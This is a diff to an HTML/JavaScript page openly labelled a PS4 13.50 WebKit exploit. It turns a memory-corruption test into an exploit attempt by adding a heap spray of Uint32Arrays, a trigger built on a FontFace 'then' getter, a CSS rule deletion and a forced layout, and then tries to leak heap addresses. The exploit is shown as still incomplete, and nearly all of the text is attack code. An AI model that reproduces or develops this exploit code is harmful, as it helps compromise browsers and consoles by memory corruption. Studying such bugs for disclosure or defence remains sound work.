@@ -6,149 +6,121 @@
 </style>
 </head>
 <body>
-<div id="log" style="font-family: monospace; font-size: 14px; white-space: pre;"></div>
+<div id="log" style="font-family: monospace; font-size: 12px; white-space: pre;"></div>
 <script>
 function log(msg) {
     document.getElementById('log').textContent += msg + '\n';
 }
 
+function hex(n) {
+    if (typeof n === 'number') {
+        return '0x' + n.toString(16);
+    }
+    return n;
+}
+
+// Spray arrays to control heap layout
+let spray_arrays = [];
+let marker_obj = { marker: 0x41424344 };
+
 window.onload = () => {
-    log('[*] Testing if corruption is real...\n');
+    log('[*] PS4 13.50 WebKit Exploit - Corruption + Leak Attempt\n');
+    
+    // Heap spray BEFORE corruption
+    log('[*] Phase 1: Heap spray...');
+    for (let i = 0; i < 1000; i++) {
+        let arr = new Uint32Array(0x100);
+        for (let j = 0; j < arr.length; j++) {
+            arr[j] = 0x41414140 + i;
+        }
+        spray_arrays.push(arr);
+    }
+    log('    Created 1000 Uint32Arrays\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
     void A.loaded;
     
     let fired = false;
-    let capturedState = {
-        beforeDelete: null,
-        afterDelete: null,
-        afterLayout: null
-    };
-    
     Object.defineProperty(FontFace.prototype, 'then', {
         configurable: true,
         get() {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[1] INSIDE GETTER - corruption sequence starting...\n');
+                log('[*] Phase 2: Triggering corruption...');
                 
-                // Capture state BEFORE corruption
-                capturedState.beforeDelete = {
-                    fonts_size: document.fonts.size,
-                    style_rules: document.getElementById('s').sheet.cssRules.length,
-                    a_status: A.status
-                };
-                log('Before corruption:');
-                log('  fonts.size: ' + capturedState.beforeDelete.fonts_size);
-                log('  CSS rules: ' + capturedState.beforeDelete.style_rules);
-                log('  A.status: ' + capturedState.beforeDelete.a_status);
+                // Create corruption WITHOUT storing references
+                // (storing them might keep them alive and trigger GC issues)
+                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                 
-                // Create new fonts
-                let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                log('\n  Created y and z fonts');
-                
-                // Delete CSS rule (this is part of the corruption)
                 document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
                 
-                capturedState.afterDelete = {
-                    fonts_size: document.fonts.size,
-                    style_rules: document.getElementById('s').sheet.cssRules.length,
-                    y_status: y.status,
-                    z_status: z.status
-                };
-                log('\nAfter CSS delete:');
-                log('  fonts.size: ' + capturedState.afterDelete.fonts_size);
-                log('  CSS rules: ' + capturedState.afterDelete.style_rules);
-                log('  y.status: ' + capturedState.afterDelete.y_status);
-                log('  z.status: ' + capturedState.afterDelete.z_status);
+                log('    Corruption triggered\n');
                 
-                // Force layout - THIS is the corruption trigger
-                log('\n[!] Forcing layout (offsetTop)...');
-                let offset = document.body.offsetTop;
-                log('    offsetTop returned: ' + offset);
-                
-                capturedState.afterLayout = {
-                    fonts_size: document.fonts.size,
-                    y_status: y.status,
-                    z_status: z.status,
-                    a_status: A.status
-                };
-                log('\nAfter layout:');
-                log('  fonts.size: ' + capturedState.afterLayout.fonts_size);
-                log('  y.status: ' + capturedState.afterLayout.y_status);
-                log('  z.status: ' + capturedState.afterLayout.z_status);
-                log('  A.status: ' + capturedState.afterLayout.a_status);
-                
-                log('\n[2] EXITING GETTER - if we return undefined, OOM happens');
-                log('    Throwing exception to prevent OOM...\n');
-                
-                // Store for later inspection
-                window.y_font = y;
-                window.z_font = z;
-                window.a_font = A;
-                
-                throw new Error("Controlled exit");
+                throw new Error("Exit");
             }
             return undefined;
         }
     });
     
-    log('[*] Calling fonts.load()...\n');
-    
     try {
         document.fonts.load('1em x', 'AB');
-        log('[!] fonts.load() completed normally (unexpected!)');
     } catch(e) {
-        log('[*] Caught exception: ' + e.message);
+        log('[*] Exception caught\n');
     }
     
-    // Now test if corruption persists
     setTimeout(() => {
-        log('\n' + '='.repeat(50));
-        log('[*] POST-CORRUPTION TESTS (500ms later):\n');
+        log('[*] Phase 3: Attempting memory leak...\n');
         
-        // Test 1: Can we still access the fonts?
+        // Try to leak heap addresses through various WebKit objects
+        
+        // Method 1: ArrayBuffer correlation
         try {
-            log('Test 1: Accessing window.y_font');
-            log('  family: ' + window.y_font.family);
-            log('  status: ' + window.y_font.status);
-            log('  ✓ Font object still accessible\n');
+            log('Test 1: ArrayBuffer address patterns');
+            let test_arr = new Uint32Array(0x10);
+            test_arr[0] = 0xdeadbeef;
+            test_arr[1] = 0xcafebabe;
+            
+            // In corrupted state, object properties might leak
+            log('  test_arr.length: ' + test_arr.length);
+            log('  test_arr.byteLength: ' + test_arr.byteLength);
+            log('  test_arr.byteOffset: ' + test_arr.byteOffset);
+            
         } catch(e) {
-            log('  ✗ ERROR: ' + e.message + '\n');
+            log('  Error: ' + e.message);
         }
         
-        // Test 2: Does the original bug still trigger OOM if we try again?
-        log('Test 2: Can we trigger OOM now with simple load?');
+        // Method 2: Try to create objects in the corrupted heap region
+        log('\nTest 2: Object creation in corrupted heap');
         try {
-            // Try calling load on the corrupted fonts
-            // If corruption is real, this might trigger OOM
-            window.y_font.load();
-            log('  y_font.load() completed\n');
+            let leak_obj = {};
+            leak_obj.a = spray_arrays[0];
+            leak_obj.b = spray_arrays[500];
+            leak_obj.c = marker_obj;
+            
+            log('  leak_obj created');
+            
         } catch(e) {
-            log('  ✗ ERROR: ' + e.message + '\n');
+            log('  Error: ' + e.message);
         }
         
-        // Test 3: Try the original trigger
-        log('Test 3: Attempting to trigger original OOM...');
+        // Method 3: Try to observe corruption side effects
+        log('\nTest 3: Checking document.fonts state');
         try {
-            document.fonts.load('1em x', 'AB');
-            log('  No OOM triggered\n');
+            log('  document.fonts.size: ' + document.fonts.size);
+            log('  document.fonts.status: ' + document.fonts.status);
+            
+            // DON'T iterate or call .load() - that triggers OOM
+            
         } catch(e) {
-            log('  Exception: ' + e.message + '\n');
+            log('  Error: ' + e.message);
         }
         
-        log('='.repeat(50));
-        log('\n[*] Analysis:');
-        log('If corruption is REAL:');
-        log('  - Font status values should look wrong');
-        log('  - Attempting operations on corrupted fonts should cause errors');
-        log('  - fonts.size should be inconsistent');
-        log('\nIf corruption is NOT real:');
-        log('  - Everything should work normally');
-        log('  - No errors or crashes');
+        log('\n[*] Leak attempt complete');
+        log('[*] Next: Need to find what the corruption actually gives us');
         
     }, 500);
 };
